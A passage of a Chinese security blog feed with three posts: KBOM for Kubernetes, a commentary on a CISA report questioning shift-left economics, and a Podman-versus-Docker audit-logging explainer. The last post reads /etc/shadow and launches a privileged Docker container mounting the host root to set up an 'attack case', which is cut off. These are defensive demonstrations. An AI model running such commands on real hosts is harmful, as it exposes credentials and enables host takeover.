版本、是否是命名空间、资源计数、具体资源等信息</td></tr><tr><td>节点信息（Node）</td><td>节点的名称、类型、主机名、容量、分配容量、标签、注解、机器 ID、架构、容器运行时版本、操作系统等信息</td></tr><tr><td>集群位置（Location）</td><td>集群位置的名称、区域和可用区等信息</td></tr></tbody></table><h3 id="（四）KBOM-的使用场景"><a href="#（四）KBOM-的使用场景" class="headerlink" title="（四）KBOM 的使用场景"></a>（四）KBOM 的使用场景</h3><p>对 KBOM 的数据结构进行分析后，我们可将 KBOM 的使用场景归纳为跨团队共享集群配置和快速识别集群中的 CVE 漏洞两方面。</p><p>尽管 Kubernetes 被誉为云操作系统，但其始终缺乏一种高效的机制来跨团队共享集群配置及其参数。</p><p>为此，KBOM 提供了一种通用的解决方案，可用于共享集群的物料清单。</p><p>它详尽地阐述了集群的托管模型、节点数量、对象信息、公共镜像以及自定义镜像等关键细节，从而能够精确地描绘出集群的全貌，有助于团队成员之间就集群的成本、合规性和安全性进行更为深入的讨论和决策。</p><p>另外，由于 Kubernetes 的许多第三方组件都是开源的，并且它们通常会在其代码仓库中发布安全公告。</p><p>组织可通过监控这些数据来保持对组件安全风险的警惕性。通过从 KBOM 中提取出组件的版本和配置信息，组织可快速对集群组件进行安全评估，从而及时发现潜在的安全漏洞并采取相应的修复措施。</p><p>这种方法极大加快了漏洞的检测和响应过程，从而提高了集群的整体安全水平。</p><h3 id="（五）总结"><a href="#（五）总结" class="headerlink" title="（五）总结"></a>（五）总结</h3><p>为了缓解 Kubernetes 组件安全，KSOC 于 2023 年发布了首个 KBOM 标准并开源了可自动生成 KBOM 的开源工具。</p><p>KBOM 聚焦于 Kubernetes 平台的整体安全，弥补了 IBOM 和 Kubernetes SBOM 的不足，更适合跨团队共享集群配置以及集群组件漏洞检测。</p><h2 id="四、KBOM-漏洞扫描器"><a href="#四、KBOM-漏洞扫描器" class="headerlink" title="四、KBOM 漏洞扫描器"></a>四、KBOM 漏洞扫描器</h2><h3 id="（一）漏洞扫描原理"><a href="#（一）漏洞扫描原理" class="headerlink" title="（一）漏洞扫描原理"></a>（一）漏洞扫描原理</h3><p>在深入探讨了 KBOM 的概念及其应用场景之后，我们将以开发 KBOM 漏洞扫描工具作为我们的主要实践目标。</p><p>如前所述，我们可以通过调用 GitHub 的 REST API 接口来获取<a href="https://github.com/miao2sec/collect-cloud-native-sec-vuln">安全公告数据</a>，进而提取出受漏洞影响的版本信息，并将其与集群 KBOM 中的版本信息进行比对。</p><p>然而，与 CNCF 的大多开源组件不同的是，Kubernetes 的安全公告数据为非结构化数据，主要存储在 Github Issue 中，并被打上“official-cve-feed”标签。</p><p>因此，在实验验证成功之后，我们投入了大量时间研究如何自动化处理这些非结构化的安全公告数据。</p><p><img src="/image/683.webp" alt="图 10:Kubernetes 的非结构化安全公告数据（左）与 Containerd 的结构化安全公告数据（右）"></p><h3 id="（二）又一个-KBOM-概念提出"><a href="#（二）又一个-KBOM-概念提出" class="headerlink" title="（二）又一个 KBOM 概念提出"></a>（二）又一个 KBOM 概念提出</h3><p>这时，<a href="https://www.aquasec.com/blog/introducing-kbom-kubernetes-bill-of-materials/">Aqua Security 推出了新的 KBOM 概念</a>，主要从关键组件视角对集群信息进行搜集，涵盖了控制平面组件、节点组件以及插件组件。Aqua Security 并不将 KBOM 视为新标准，而是认为它应与其他 BOM 格式兼容，并计划将 KBOM 安全扫描功能集成到开源工具 Trivy 中。</p><p><img src="/image/684.webp" alt="图 11：Auqa Security 发布的 KBOM 概念"></p><p>次日，我们与 Aqua Security 的开源副总裁、CNCF 大使 Itay Shakury 就 KBOM 的相关问题进行了深入交流。在对话中，Aqua Security 表达了他们的愿景：希望 Trivy 能够提供原生的 KBOM 生成功能，正如市面上已有多种工具能够生成 SBOM，但 Trivy 依然提供了原生的 SBOM 生成功能。此外，他们在研究 KBOM 之初，KSOC 尚未发布 KBOM 的标准，他们认为 KBOM 应作为一个概念而非标准，并应与 CycloneDX 格式兼容。尽管如此，他们后来仍尝试与 KSOC 团队取得联系，但由于种种原因，未能实现合作。</p><p>在交流过程中，我们注意到问题关键点可能在于：Aqua Security 在开展相关工作时，KSOC 尚未发布 KBOM 的标准。这一点在与 Itay 的初次交流中可见一斑，他最初仅就 Kubernetes SBOM 与 KBOM 的区别进行了回复。在得知 KSOC 发布的 KBOM 标准和工具后，他删除了原先的回复，并在两天后重新作出回应，此时他们尚不知 KSOC 已支持 CycloneDX 格式。</p><p><img src="/image/685.webp" alt="图 12：与 Aqua Security 的开源副总裁、CNCF 大使 Itay Shakury 就 KBOM 进行了交流"></p><p>在本次交流过程中，我们初步认识到 KBOM 不仅在规范管理、数据格式及标准文件方面存在缺失，且在宣传推广、资料准备、社区及生态支持方面亦显不足。</p><p>为防止类似状况再次出现，并考虑到 Aqua Security 拥有更为充沛的人力以及丰富的云原生安全经验，我们决定暂缓相关项目工作。此举旨在观察 Aqua Security 具体如何定义 KBOM 并将其进行落地和应用。</p><p>2023 年 10 月 14 日，<a href="https://github.com/aquasecurity/trivy/discussions/5377">首个 KBOM 漏洞扫描功能在开源工具 Trivy 中得以实现</a>。Trivy 首先需要为集群生成 CycloneDX 格式的 KBOM，随后利用其 SBOM 扫描功能对生成的 KBOM 进行漏洞检测。</p><p>与我们的预期有所差异的是：Trivy 当前的 KBOM 扫描功能主要局限于 API Server、Kubelet 以及 Kube Proxy 等核心组件。对于我们所关注的 Kubernetes 第三方生态组件的漏洞检测却尚未涵盖。展望未来，我们仍需在 KBOM 漏洞检测领域投入大量工作。</p><h3 id="（三）总结-2"><a href="#（三）总结-2" class="headerlink" title="（三）总结"></a>（三）总结</h3><p>在深入探讨了 KBOM 的概念及其应用场景之后，我们开始了 KBOM 漏洞扫描器的开发工作。然而，开发过程亦存在许多挑战，例如，该如何自动处理非结构化的安全公告数据。</p><p>在此期间，Aqua Security 提出了 KBOM 的新理念，并发布了首个 KBOM 漏洞扫描器。通过与 Aqua Security 团队的深入交流，我们意识到了 KBOM 在非技术层面的局限性，并开始思考：KBOM 究竟应该是一个标准还是仅仅停留在概念层面？KBOM 是否需要一个标准？</p><h2 id="五、总结与展望"><a href="#五、总结与展望" class="headerlink" title="五、总结与展望"></a>五、总结与展望</h2><h3 id="（一）KBOM-的优势"><a href="#（一）KBOM-的优势" class="headerlink" title="（一）KBOM 的优势"></a>（一）KBOM 的优势</h3><p>毫无疑问，KBOM 的应用为集群的透明度提供了保障，使得对集群安全风险的全面评估和快速应急响应成为可能。</p><p>此外，KBOM 的生成成本相对较低，与 SBOM 不同，它无需遍历文件系统或对镜像内容进行分析，也不需要与大量开发者的多样化版本管理策略相兼容。KBOM 的创建仅通过向 API Server 发起 HTTP 请求即可实现。</p><p>在业务环境中，KBOM 亦具备广泛的应用场景，例如，可用于跨团队共享集群信息，以及对集群组件的漏洞进行全面的安全评估。</p><h3 id="（二）KBOM-的不足"><a href="#（二）KBOM-的不足" class="headerlink" title="（二）KBOM 的不足"></a>（二）KBOM 的不足</h3><p>然而，我们必须正视 KBOM 技术当前存在的一些局限性。</p><p>首先，KBOM 作为一个新兴技术，其成熟度尚显不足，缺乏统一的管理规范和数据格式标准。例如，在无任何工作负载的单个 Kubernetes 集群中，KSOC 生成了超过 5,000 条数据记录，而 Trivy 仅生成了 50 余条。在处理大规模 Kubernetes 集群时，直接通过访问 API Server 生成 KBOM 可能会导致速度显著下降，因此，考虑从缓存中读取集群信息等优化策略是必要的。</p><p>其次，KBOM 缺乏正式的标准。尽管 SBOM 的概念已有十年历史，并在 2022 年已被纳入合规性法规文件中，但 KBOM 尚未被任何正式文件所采纳。</p><p>最后，KBOM 在社区支持和公开资料方面也存在不足。由于宣传推广不足，导致 Aqua Security 重复开展了相似的工作。KBOM 的生态系统和社区尚未完全建立，因此，尽管 KSOC 提出了相关标准，但支持该标准的工具和生态尚未得到充分开发和完善。此外，关于 KBOM 的研究资料相对匮乏，目前公开可获取的资料中，缺乏深入的分析和解读。</p><h3 id="（三）总结-3"><a href="#（三）总结-3" class="headerlink" title="（三）总结"></a>（三）总结</h3><p>正如许多在实验室中孕育的创新技术一样，KBOM 要在实际业务环境中发挥其真正的潜力，不仅需要吸引更多技术人员的参与研究，还必须在更加多元化的应用场景中进行测试应用，以确保其安全能力和稳定性。同时，企业的高层管理者也必须在 KBOM 所提供的安全保障与所需的成本投入之间找到恰当的平衡点。</p>]]></content>
    
    
    
    <tags>
      
      <tag>云原生安全</tag>
      
      <tag>Kubernetes 安全</tag>
      
      <tag>供应链安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>客户真的注重安全吗？安全左移真的有成本效益吗？</title>
    <link href="/2025/01/16/%E5%AE%A2%E6%88%B7%E7%9C%9F%E7%9A%84%E6%B3%A8%E9%87%8D%E5%AE%89%E5%85%A8%E5%90%97%EF%BC%9F%E5%AE%89%E5%85%A8%E5%B7%A6%E7%A7%BB%E7%9C%9F%E7%9A%84%E6%9C%89%E6%88%90%E6%9C%AC%E6%95%88%E7%9B%8A%E5%90%97%EF%BC%9F/"/>
    <url>/2025/01/16/%E5%AE%A2%E6%88%B7%E7%9C%9F%E7%9A%84%E6%B3%A8%E9%87%8D%E5%AE%89%E5%85%A8%E5%90%97%EF%BC%9F%E5%AE%89%E5%85%A8%E5%B7%A6%E7%A7%BB%E7%9C%9F%E7%9A%84%E6%9C%89%E6%88%90%E6%9C%AC%E6%95%88%E7%9B%8A%E5%90%97%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>2024 年 11 月 28 日，我们转发了安全喵喵站的一篇文章<a href="https://mp.weixin.qq.com/s/jbA61jO9tKPlUS3zdnarmg">《“安全左移”，或许没有意义》</a>。这篇文章的创作灵感主要来自于 CISA 于 2024 年 10 月 11 日发布的一份政府性报告。</p><p>CISA 在这份报告中对“<strong>开发早期修复软件漏洞合理性的 100 倍指标</strong>”提出了质疑，报告一发出，互联网上掀起了一波关于将安全代码责任转嫁给开发人员的争论。</p><p>其实，报告并不只挑战了“开发早期修复软件漏洞合理性的 100 倍指标”这一安全领域的基本观点，还通过分析历史重大安全事件质疑“<strong>安全缺陷真的会让客户放弃产品或服务吗”</strong>。</p><p><img src="/image/666.webp" alt="图 1：我认为这并不是安全领域所期望的‘左移’策略"></p><p>报告篇幅不长，只有 3 页内容，却干货满满。所以，今天我们通过解读这份报告来重塑我们的安全建设观念。本文主要包括以下内容：</p><ol><li>报告发布者（安全设计小组委员会）的基本介绍。</li><li>报告发布的背景。</li><li>报告所挑战的两个基本观念：安全缺陷真的会让客户放弃产品或服务吗？以及在开发过程中尽早发现并修复安全漏洞真的更符合成本效益吗？</li><li>报告最终的总结及建议。</li></ol><p>为了深度解读这篇报告并进行推广，我们在保留了报告原本观点的前提下进行了译意与润色。完整的报告内容点击【阅读原文】即可进行下载。</p><h2 id="0x01-安全设计小组委员会"><a href="#0x01-安全设计小组委员会" class="headerlink" title="0x01 安全设计小组委员会"></a>0x01 安全设计小组委员会</h2><p>敢于挑战安全领域的一些基本观点，我们先来看看报告的发布者，即安全设计小组委员会到底是何方神圣！</p><p><a href="https://www.cisa.gov/securebydesign" title="安全设计小组委员会">安全设计小组委员会</a>（Secure by Design，简称 SBD）位于<a href="https://www.cisa.gov/" title="美国网络安全和基础设施安全局">美国网络安全和基础设施安全局</a>（Cybersecurity and Infrastructure Security Agency，简称 CISA）之下的<a href="https://www.cisa.gov/resources-tools/groups/cisa-cybersecurity-advisory-committee" title="网络安全咨询委员会">网络安全咨询委员会</a>（Cybersecurity Advisory Committee，简称 CSAC），主要负责研究可能阻碍采用安全设计原则的经济障碍，下文简称 SBD。</p><p><img src="/image/667.png" alt="图 2：安全设计小组委员会"></p><p>SBD 的设立的初衷以及主要的任务为：</p><ol><li>为 CSAC 的审议和投票提供建议，以审查 CISA 如何鼓励持久性和系统性的行动来降低国家安全风险；</li><li>研究和应对导致当前风险状态的经济因素；</li><li>研究历来限制安全软件和硬件制造的供求因素。</li></ol><p>总的来说，SBD 需要解决以下两个问题：</p><ol><li><strong>哪些激励因素和经济力量会促进或阻碍软件制造商采用安全设计做法？CISA 如何调整这些因素，以鼓励软件制造商开发更安全的软件？</strong></li><li>如果每个企业和消费者都把网络安全作为软件购买的首要标准，不安全软件的问题就会开始自行解决。但<strong>CISA 如何能够在采购过程中形成“按需安全”的规范？此外，这样的规范如何帮助客户要求增加攻击成本的安全功能，而不是满足于那些仅仅无效的、作为复选框存在的安全功能？</strong></li></ol><h2 id="0x02-报告发布的背景"><a href="#0x02-报告发布的背景" class="headerlink" title="0x02 报告发布的背景"></a>0x02 报告发布的背景</h2><p>在过去的两年里，CISA 通过“安全设计”（Secure by Design）计划成功地提高了网络安全标准。与超过 17 个国内外的合作伙伴合作，发布了关于保护美国免受日益变化的网络威胁所需的关键安全原则的明确指导。如今，已有超过 200 家软件制造商表示支持，并表示在实施“安全设计”原则方面取得了可衡量的进展。</p><p>CISA 目前已成功地提高了人们对“安全设计”原则的认识，所以其下一步计划是鼓励“安全设计”的广泛采用。</p><p><img src="/image/668.png" alt="图 3：任何速度都不安全：CISA 促进科技生态系统安全的计划"></p><p>在过去的六个月里，SBD 一直专注于确定一系列建议，以使 CISA 在“安全设计”原则的广泛采用方面取得可衡量的进展。</p><p>SBD 不仅与公共部门和私营行业进行了交流，以收集见解和想法，促进这些原则的采用。还与学者、领域专家、CISA 的法律团队以及 CISA 的认证团队进行了会面，以了解是什么激励组织实施更好的安全措施。</p><p><strong>可是 SBD 不但没有得出一些预期之内的研究成果，反而挑战了安全领域的一些长期持有的基本观点。主要原因为：这些观点并没有确凿的证据支撑。</strong></p><h2 id="0x03-观点-1：安全缺陷真的会让客户放弃产品或服务吗？"><a href="#0x03-观点-1：安全缺陷真的会让客户放弃产品或服务吗？" class="headerlink" title="0x03 观点 1：安全缺陷真的会让客户放弃产品或服务吗？"></a>0x03 观点 1：安全缺陷真的会让客户放弃产品或服务吗？</h2><h3 id="3-1-历史重大安全事件"><a href="#3-1-历史重大安全事件" class="headerlink" title="3.1 历史重大安全事件"></a>3.1 历史重大安全事件</h3><p>安全真的会让客户放弃产品或服务吗？可现实是：<strong>许多经历过历史重大安全事件的公司至今仍然正常运营，且通常情况下，质量问题似乎并不总是影响着客户忠诚度。</strong></p><p>2013 年，Target 数据泄露事件被认为是历史上最大的安全泄露事件之一。由于缺乏网络隔离，攻击者能够利用第三方门户进入 Target 网络并窃取 4000 万条信用卡和借记卡记录。十一年后，Target 还被认为是美国十大零售商之一。</p><p><img src="/image/669.png" alt="图 4:2013 年 Target 数据泄露事件"></p><p>2016 年，三星被迫宣布召回售价 800 多美元的三星 Galaxy Note 7 设备，因为有大量报告称这款手机起火了。当时的报道估计，这 “<a href="https://www.reuters.com/article/us-samsung-elec-smartphones-costs-idUSKCN12B0FX/" title="可能会在三星账户上烧掉 170 亿美元的窟窿">可能会在三星账户上烧掉 170 亿美元的窟窿</a>“。八年后，三星仍在生产智能手机，并被认为是全球五大智能手机制造商之一。</p><p><img src="/image/670.png" alt="图 5：Note 7 惨败可能让三星账户损失 170 亿美元"></p><p>2020 年，SolarWinds 网络攻击被称为 “世界上有史以来最大、最复杂的攻击”。近 18,000 家公共和私营机构受到微软分发的恶意软件感染更新的影响。<a href="https://www.sec.gov/Archives/edgar/data/1739942/000162828020017451/swi-20201214.htm" title="在 2020 年 12 月发现攻击时，SolarWinds 报告有 30 多万客户">在 2020 年 12 月发现攻击时，SolarWinds 报告有 30 多万客户</a>。四年后的今天，SolarWinds 依然存在，并且仍拥有 30 多万客户。</p><p><img src="/image/671.png" alt="图 6:2020 年 SolarWinds 网络攻击事件"></p><h3 id="3-2-不修复漏洞会影响到业务不足以达到激励作用"><a href="#3-2-不修复漏洞会影响到业务不足以达到激励作用" class="headerlink" title="3.2 不修复漏洞会影响到业务不足以达到激励作用"></a>3.2 不修复漏洞会影响到业务不足以达到激励作用</h3><p>因此，仅仅告诉组织，如果不修复安全漏洞将会影响到业务，并不足以达到激励的作用。因为，在大规模的安全事件发生过后，已有客户还会受到以下因素的影响：</p><ul><li><strong>转用其他品牌的潜在成本；</strong></li><li><strong>客户愿意花多少精力去了解安全事件的影响；</strong></li><li><strong>发生安全事件的公司关于应对措施的营销信息的有效性。</strong></li></ul><p>此外，客户通常会说服自己：在发生安全事件后，无论是否做出实际改变，公司都会自然而然地采取更多措施来改善安全状况。</p><p>并且，目前还不清楚这些因素是否会影响到新的潜在客户。</p><h2 id="0x04-在开发过程中尽早发现并修复安全漏洞真的更符合成本效益吗？"><a href="#0x04-在开发过程中尽早发现并修复安全漏洞真的更符合成本效益吗？" class="headerlink" title="0x04 在开发过程中尽早发现并修复安全漏洞真的更符合成本效益吗？"></a>0x04 在开发过程中尽早发现并修复安全漏洞真的更符合成本效益吗？</h2><h3 id="4-1-开发早期修复软件漏洞合理性的-100-倍指标"><a href="#4-1-开发早期修复软件漏洞合理性的-100-倍指标" class="headerlink" title="4.1 开发早期修复软件漏洞合理性的 100 倍指标"></a>4.1 开发早期修复软件漏洞合理性的 100 倍指标</h3><p>大家普遍认为，早期修复漏洞更具成本效益，”左移”（Shift left）也强调在开发过程中尽早地进行测试活动。</p><p><strong>安全左移的理念是：尽早识别出安全漏洞不仅能生产出更高质量的产品，还能降低安全成本。然而，问题在于：如何量化投资。</strong></p><p>软件行业有许多文章提到 IBM 系统科学研究所的一项研究，称在设计阶段修复漏洞的成本比实施后修复漏洞的成本低 100 倍。但经过进一步研究发现，没有证据表明 IBM 系统科学研究院是一个官方的研究机构。它似乎是 IBM 的一个内部项目，且自 20 世纪 80 年代以来就不存在了。</p><p>此外，大多数人还引用了 Barry Boehm 于 1988 年的一项声明，即在交付后查找并修复软件问题的成本通常比在设计阶段查找问题的成本高 100 倍。然而，用于此成本估算的具体成本因素尚不清楚，并且自 20 世纪 80 年代以来软件开发实践已经发展得更加敏捷。</p><p>最近，<a href="https://www.ibm.com/reports/data-breach" title="IBM 和 Ponemon Institute 还发布了有关安全漏洞成本的报告">IBM 和 Ponemon Institute 还发布了有关安全漏洞成本的报告</a>，但这些报告不包括有关在安全漏洞发生之前发现并修复安全漏洞成本的任何数据。</p><p><img src="/image/672.png" alt="图 7：IBM 和 Ponemon Institute 发布的关于安全漏洞成本的报告"></p><h3 id="4-2-尚无衡量成本的策略"><a href="#4-2-尚无衡量成本的策略" class="headerlink" title="4.2 尚无衡量成本的策略"></a>4.2 尚无衡量成本的策略</h3><p>SBD 还注意到，公司并没有衡量不遵循安全设计原则的真实成本，而且目前还没有一个统一的策略来理解不安全的总拥有成本。</p><p><img src="/image/673.png" alt="图 8：CISA 认同“左移”是有经济效益的，关键在于组织应该投入多少才可以获得经济效益"></p><p><strong>尽管关于早期发现安全漏洞的经济效益并没有确切的数据，但普遍认为早期发现是有经济益处的。问题是，一个组织需要投入多大的比例才能实现这种益处？</strong></p><h3 id="4-3-CISA-是否可促进自动化指标的研究和开发"><a href="#4-3-CISA-是否可促进自动化指标的研究和开发" class="headerlink" title="4.3 CISA 是否可促进自动化指标的研究和开发"></a>4.3 CISA 是否可促进自动化指标的研究和开发</h3><p>理想情况下，任何软件项目在投入生产环境之前都应该经历一系列自动化的安全检查。随着新的自动化检查的增加，安全标准将持续提高。</p><p>CISA 可以在策划应执行的标准安全检查方面发挥作用。对于关键基础设施，CISA 还可以在测试这些安全检查并给出报告方面发挥作用。</p><p>许多目前可用的安全检查旨在发现源代码中的缺陷实例，但本质上无法找到所有（甚至大多数）此类漏洞的实例。</p><p>CISA 可以促进研究和开发自动化指标，以确定软件是否符合安全设计实践和原则，例如“衡量优点”与“衡量缺点”。</p><p>小组委员会与 CISA 的法律团队和评估团队进行了会面，并发现 CISA 可以使用现有机制来评估关键基础设施并发布结果，但这也存在一些限制：</p><ul><li>CISA 不能强制要求关键基础设施实体进行网络安全影响评估。</li><li>如果关键基础设施实体自愿选择参与，CISA 可能能够对其网络安全影响进行评估。</li><li>通常情况下，如果没有实体的许可，CISA 不能发布评估结果。</li></ul><p><strong>最重要的是，CISA 影响管理关键基础设施实体的预算决策的途径有限。应该赋予 CISA 更多的影响力。</strong></p><h2 id="0x05-总结与建议"><a href="#0x05-总结与建议" class="headerlink" title="0x05 总结与建议"></a>0x05 总结与建议</h2><p><strong>若要研究是否可以使用明确的指标来量化那些经历过大规模安全事件并成功复苏的公司的财务影响和客户体验影响，将长达三到五年的时间。</strong> 在数据收集时，应该探讨以下问题：</p><ul><li>新老客户在面对大规模安全事件时的行为反应；</li><li>随着时间推移，从安全事件中恢复的总成本。</li></ul><p><strong>应进一步研究，以提供实证数据来证实在软件开发生命周期早期修复安全漏洞是否确实更具成本效益。</strong></p><ul><li>若无法确定实施安全设计原则的具体美金，但提供相关的投资比例的指导也可能会鼓励组织采用这些原则；</li><li>若没有发现可衡量的财务影响，那么放弃使用经济效益作为安全开发的激励可能也是有意义的。</li></ul><p><strong>考虑到 CISA 之前提出的限制，CISA 仍需经过多年的不懈奋斗，才能迈出守护关键基础设施安全的关键第一步。</strong> 例如：</p><ul><li>设计一个框架且标准化的“安全影响研究”，这个研究应该是轻量级的，基于现有标准（如美国国家标准与技术研究院或 CISA 的“安全设计”原则），并且容易被技术和非技术人员理解和执行。这项研究需要以一种具有成本效益的方式进行。</li><li>这些影响研究应该基于自愿或选择加入的原则进行，并向任何属于国家关键基础设施的组织提供。研究的结果应该只提供给参与的组织，且 CISA 应该定期公开发布汇总或匿名化的数据。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>安全建设</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>为什么 Podman 比 Docker 更安全（一）</title>
    <link href="/2025/01/09/%E4%B8%BA%E4%BB%80%E4%B9%88-Podman-%E6%AF%94-Docker-%E6%9B%B4%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2025/01/09/%E4%B8%BA%E4%BB%80%E4%B9%88-Podman-%E6%AF%94-Docker-%E6%9B%B4%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>今天，我们将从日志审计的角度探讨：为什么 Podman 比 Docker 更安全？</p><ol><li>首先，我们需要了解 Linux 的 audit 日志审计功能和 <code>loginuid</code> 的基础知识；</li><li>然后，我们将分别使用 Podman 和 Docker 启动容器，分析容器中 <code>loginuid</code> 的变化及其原因；</li><li>最后，我们将通过真实攻击场景，展示 <code>loginuid</code> 的变化如何影响安全防护；</li></ol><p>本文所有的验证都在 ubuntu 22.04 之上进行，且登录用户为 <code>yaney</code>。</p><p><img src="/image/657.webp" alt="图 1:操作环境"></p><h2 id="0x01-Linux-的基础知识"><a href="#0x01-Linux-的基础知识" class="headerlink" title="0x01 Linux 的基础知识"></a>0x01 Linux 的基础知识</h2><h3 id="1-1-audit-审计功能"><a href="#1-1-audit-审计功能" class="headerlink" title="1.1 audit 审计功能"></a>1.1 audit 审计功能</h3><p>在讨论 <a href="https://podman.io/" title="Podman">Podman</a> 和 Docker 的安全性之前，我们需要了解一些关于 Linux audit 审计功能的基础知识。</p><p>Linux 内核有一个名为 audit 的安全功能，管理员可以通过该功能监视系统上的安全事件，并记录在本地的 <code>audit.log</code> 文件中。此外，audit 日志还可以远程存储在其他主机上，以防攻击者试图掩盖其入侵的痕迹。</p><p>我们以审计 <code>/etc/shadow</code> 文件上的操作为例进行说明。<code>/etc/shadow</code> 文件是一个常见的安全文件，攻击者可以向其中增加记录，从而重新获得系统的访问权限。</p><p><img src="/image/658.png" alt="图 2: 通过 audit 审计 &#x2F;etc&#x2F;shadow，并对 &#x2F;etc&#x2F;shadow 进行操作"></p><ol><li><p>如上图所示，左边图我们安装了 auditd 软件包，并通过 <code>auditctl</code> 写入规则，开始审计 <code>/etc/shadow</code> 文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> auditctl -w /etc/shadow<br><br></code></pre></td></tr></table></figure></li><li><p>右边的图，我们切换到 root 用户身份，并通过下面命令，对目标文件进行操作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/shadow<br><br></code></pre></td></tr></table></figure></li><li><p>最后，我们使用 audit 所提供的工具 <code>ausearch</code> 来搜索近期与 <code>/etc/shadow</code> 文件相关的事件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ausearch -f /etc/shadow -i -ts recent<br><br></code></pre></td></tr></table></figure></li></ol><p>一会儿时间，audit 就记录了许多信息，我们不需要去解读这些信息，只需关注一个问题，那就是：<strong>为什么 audit 能够正确地记录是 root 用户（uid&#x3D;root）查看了</strong> <code>/etc/shadow</code> <strong>文件，但该进程的原始登录用户（auid&#x3D;yaney）是 yaney 呢？</strong></p><p><img src="/image/659.png" alt="图 3:audit 可以正确记录原始登录用户是 yaney"></p><h3 id="1-2-loginuid"><a href="#1-2-loginuid" class="headerlink" title="1.2 loginuid"></a>1.2 loginuid</h3><p>要回答这个问题，我们不得不了解 Linux 内核有个名为<code>loginuid</code>的属性了。</p><p><code>loginuid</code>存储在虚拟文件系统<code>/proc/self/loginuid</code> 中，用来标识登录的用户。每当我们登录系统时，<code>loginuid</code>就被设置为用户的 ID（<code>UID</code>），且内核不允许任何进程对他进行修改。</p><p>最重要的是，<strong>从该登录进程派生出来的所有子进程都会继承这个 <code>loginuid</code>，并形成一条“跟踪链”</strong>，这使得系统能够追踪到当前活动是由哪个登录用户发起的。例如：当我以 yaney 的身份进入系统时，<code>loginuid</code> 的编号为 1000；当我切换用户至 root 时，<code>loginuid</code>的编号还是 1000。</p><p><img src="/image/660.png" alt="图 4: 由登录进程派生出来的子进程会继续继承 loginuid"></p><h2 id="0x02-Podman-和-Docker-容器中的-loginuid-差异"><a href="#0x02-Podman-和-Docker-容器中的-loginuid-差异" class="headerlink" title="0x02 Podman 和 Docker 容器中的 loginuid 差异"></a>0x02 Podman 和 Docker 容器中的 loginuid 差异</h2><p>众所周知，容器只是宿主机中一个特殊的进程，那么容器中的<code>loginuid</code>又是怎样的呢？</p><p>我们分别用 Podman 和 Docker 启动容器，发现：**Podman 的容器正确记录了我们的<code>loginuid</code>，而 Docker 的容器记录的却<code>4294967295</code>。**docker 所记录的这个数字并不是一个随机的数字，我们后面再说。</p><p><img src="/image/661.png" alt="图 5:docker 容器和 podman 容器中的 loginuid 不一致"></p><p>那么，造成这种差异的原因又是什么呢？</p><p><strong>Podman 使用的是传统的 fork&#x2F;exec 模型</strong>，即 Podman 调用 <code>fork</code> 系统调用来创建一个子进程，这个子进程几乎完全复制了父进程的状态，与父进程共享相同的内存内容。子进程创建后，再调用 <code>exec</code> 或 <code>execve</code> 来替换自己的代码和数据。因此 Podman 容器进程是 Podman 的后代，podman 容器中的<code>loginuid</code>与宿主机上的<code>loginuid</code>完全一致。</p><p>**而 Docker 使用的是 C&#x2F;S 模型。**当我们执行 docker 命令时，本质上是 Docker 客户端工具（docker cli）向 Docker 守护进程（dockerd）发送请求，dockerd 来处理与 docker cli 的 stdin&#x2F;stdout 通信并创建容器。所以 Docker 容器是 dockerd 的后代，需要与守护进程的<code>loginuid</code> 一致。</p><p>前面我们说了 Docker 容器的 <code>loginuid</code> 并不是一个随机数，那是因为 dockerd 是初始化系统的子进程，它的 <code>loginuid</code> 是未经过设置的默认值，具体为 32 位无符号整数的最大值<code>0xFFFFFFFF</code>，即十进制的<code>4294967295</code>。这种情况，audit 一般会将 <code>auid</code> 设置为 <code>unset</code> 表示该进程无法关联到登录用户。</p><p>我们可以查看 dockerd 或 systemd 的<code>loginuid</code>来进行验证。如图所示，dockerd 和 systemd 的 loginuid 都是默认值<code>4294967295</code>。</p><ol><li><p>查看 dockerd 和 systemd 的进程 ID（systemd 的进程 ID 一般为 1）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps -eo pid,uid,<span class="hljs-built_in">comm</span> | egrep <span class="hljs-string">&#x27;dockerd|systemd&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>查看 dockerd 和 systemd 的 loginuid。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/[pid]/loginuid<br></code></pre></td></tr></table></figure></li></ol><p><img src="/image/662.png" alt="图 6: dockerd 和 systemd 的 loginuid 为默认值"></p><h2 id="0x03-攻击案例：从容器中修改宿主机文件"><a href="#0x03-攻击案例：从容器中修改宿主机文件" class="headerlink" title="0x03 攻击案例：从容器中修改宿主机文件"></a>0x03 攻击案例：从容器中修改宿主机文件</h2><p>那么，如果我们通过启动 Podman 容器和 Docker 容器来修改宿主机的 <code>/etc/shadow</code> 文件，audit 记录下来的日志又有什么区别呢？我们先来看看 Docker 容器的。</p><ol><li><p>启动一个可交互的临时的特权容器，并将宿主机的根目录挂在到容器的 <code>/host</code> 目录中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> docker run -it --<span class="hljs-built_in">rm</span> --privileged -v /:/host alpine 